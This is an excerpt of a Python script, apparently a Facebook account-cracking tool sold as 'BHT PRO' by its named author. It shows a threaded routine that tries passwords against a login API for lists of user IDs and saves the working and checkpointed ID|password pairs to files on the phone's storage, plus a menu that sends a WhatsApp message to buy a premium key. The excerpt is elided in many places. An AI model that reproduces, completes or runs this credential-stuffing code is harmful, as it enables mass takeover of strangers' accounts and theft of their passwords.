...
\33[1;32m───────────────────────────────────────────────────────
\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMARUF ALI
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mMARUF ALI
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mMF Phishing Attack pro
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801308120944&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MARUF Sir, I Need To Buy Your Paid BHT PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def gmail():
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit('MARIF ')[0]
                                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MARUF-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MARUF-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [MARUF-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MARUF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MARUF-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MARUF-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MARUF-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MARUF-OK] '+uid+' | '+pas+'\033[1;97m')
